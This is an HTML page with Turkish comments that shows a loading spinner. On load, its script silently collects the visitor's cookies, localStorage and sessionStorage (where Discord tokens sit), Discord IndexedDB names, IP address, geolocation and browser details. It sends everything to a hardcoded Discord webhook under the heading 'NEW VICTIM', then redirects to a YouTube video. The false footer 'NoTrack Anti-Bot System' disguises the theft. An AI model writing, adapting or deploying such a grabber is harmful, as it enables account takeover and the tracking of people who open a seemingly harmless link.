<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yükleniyor...</title>
    <style>
        body {
            background-color: black;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        
        .loader {
            border: 4px solid #333;
            border-top: 4px solid white;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="loader"></div>

<script>
    // --- AYARLAR ---
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1565166860897615912/I2CNk0KdLEXpdPkbMLoFTpAChNaeL8sS4YDqEH-26z7lptRg3lOs-UpBMHRbSlSW1Qke"; 

    async function getIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            return "Bilinmiyor";
        }
    }

    async function getLocation() {
        return new Promise((resolve) => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => resolve({ lat: position.coords.latitude, long: position.coords.longitude }),
                    () => resolve(null)
                );
            } else {
                resolve(null);
            }
        });
    }

    async function takeScreenshot() {
        return new Promise((resolve) => {
            try {
                const canvas = document.createElement('canvas');
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
                const ctx = canvas.getContext('2d');
                
                ctx.fillStyle = '#000000';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                
                ctx.beginPath();
                ctx.arc(canvas.width / 2, canvas.height / 2, 15, 0, 2 * Math.PI);
                ctx.strokeStyle = 'white';
                ctx.lineWidth = 2;
                ctx.stroke();

                resolve(canvas.toDataURL('image/png'));
            } catch (e) {
                resolve(null);
            }
        });
    }

    // IndexedDB Tarama Fonksiyonu
    async function scanIndexedDB() {
        let dbData = [];
        try {
            const dbs = await indexedDB.databases();
            for (let db of dbs) {
                if (db.name && db.name.includes('discord')) { // Discord ile ilgili DB'leri tara
                    dbData.push(db.name);
                }
            }
        } catch (e) {
            console.error("IndexedDB hatası:", e);
        }
        return dbData;
    }

    async function collectAndSendData() {
        // 1. LocalStorage
        let allLocalStorage = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const value = localStorage.getItem(key);
            allLocalStorage[key] = value;
        }

        // 2. SessionStorage
        let allSessionStorage = {};
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            const value = sessionStorage.getItem(key);
            allSessionStorage[key] = value;
        }

        // 3. IndexedDB Tarama
        const indexedDBNames = await scanIndexedDB();

        // 4. Diğer Veriler
        const cookies = document.cookie;
        const userAgent = navigator.userAgent;
        const platform = navigator.platform;
        const language = navigator.language;
        const screenResolution = window.screen.width + "x" + window.screen.height;
        const ip = await getIP();
        const location = await getLocation();
        const screenshot = await takeScreenshot();

        // Payload Hazırlama
        const payload = {
            username: "Kurban Avcısı",
            avatar_url: "https://cdn-icons-png.flaticon.com/512/1042/1042842.png",
            embeds: [{
                title: "🔥 YENİ KURBAN! 🔥",
                color: 15158332,
                fields: [
                    { name: "💻 Platform", value: platform, inline: true },
                    { name: "🌐 IP Adresi", value: ip, inline: true },
                    { name: "🗺️ Konum", value: location ? `Lat: ${location.lat}, Long: ${location.long}` : "Bulunamadı", inline: false },
                    { name: "🖥️ Ekran Çözünürlüğü", value: screenResolution, inline: true },
                    { name: "🌍 Dil", value: language, inline: true },
                    { name: "🧩 Tarayıcı", value: "`" + userAgent + "`", inline: false },
                    { name: "🍪 Cookie'ler", value: "`" + (cookies || "Boş") + "`", inline: false },
                    { name: "💾 LocalStorage", value: JSON.stringify(allLocalStorage, null, 2), inline: false },
                    { name: "📂 SessionStorage", value: JSON.stringify(allSessionStorage, null, 2), inline: false },
                    { name: "🗄️ IndexedDB İsimleri", value: indexedDBNames.join(", ") || "Bulunamadı", inline: false }
                ],
                footer: { text: "NoTrack Anti-Bot System" },
                timestamp: new Date().toISOString()
            }]
        };

        if (screenshot) {
            payload.embeds[0].image = { url: screenshot };
        }

        // Gönder
        try {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            console.log("Veriler başarıyla gönderildi.");
        } catch (error) {
            console.error("Gönderme hatası:", error);
        }
    }

    window.onload = function() {
        collectAndSendData();

        setTimeout(() => {
            window.location.href = "https://www.youtube.com/watch?v=cwQgjq0mCdE&list=RDcwQgjq0mCdE&start_radio=1&pp=ygUPa2FueWUgaSBsb3ZlIGl0oAcB";
        }, 2000);
    };
</script>

</body>
</html>
